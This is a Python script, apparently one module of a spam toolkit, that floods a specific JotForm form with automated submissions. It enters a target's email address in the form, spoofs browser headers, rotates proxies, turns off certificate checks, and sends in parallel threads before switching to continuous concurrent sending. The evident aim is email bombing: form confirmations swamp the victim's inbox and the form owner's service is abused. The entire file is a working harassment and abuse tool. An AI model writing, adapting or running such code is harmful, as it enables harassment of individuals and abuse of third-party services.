import datetime
from concurrent.futures import ThreadPoolExecutor
from os.path import basename

import requests

import module
from module import Spam

headers = {
    'authority': 'submit.jotformpro.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'origin': 'https://form.jotformpro.com',
    'referer': 'https://form.jotformpro.com/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        timestamp = str(datetime.datetime.now().timestamp()).replace(".", "")[:-3]
        form_id = '52592583518969'
        event_id = f'{timestamp}_{form_id}_{module.generate_text(7)}'

        text = self.get_text()
        data = {
            'formID': '52592583518969',
            'q9_ilearnUsername9': target,
            'q3_firstName': text,
            'q4_lastName': text,
            'q12_profReg': text,
            'q10_storeName': text,
            'q11_storeNumber': text,
            'q13_mobilePhone': text,
            'q5_personalEmail5': target,
            'q28_eosCourse': 'MECS',
            'q22_whatIs22': text,
            'q29_dataProtection29': 'By ticking this box and clicking the Submit button I agree to sharing my personal data as outlined in the data statement',
            'website': '',
            'simple_spc': '52592583518969-52592583518969',
            'event_id': event_id,
            'validatedRequiredFieldIDs': '{"id_9":true,"id_3":true,"id_4":true,"id_12":true,"id_10":true,"id_11":true,"id_13":true,"id_5":true,"id_28":true,"id_22":true,"id_29":true}',
        }

        response = requests.post('https://submit.jotformpro.com/submit/52592583518969/', headers=headers, data=data,
                                 proxies=self.get_proxies(), timeout=10, verify=False)
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'Thank You')

    with ThreadPoolExecutor(10) as worker:
        results = worker.map(spam.send_post, ['wezxasqw@gmail.com' for _ in range(15)])
    if any(results):
        spam.run_concurrently(60)


if __name__ == '__main__':
    main()
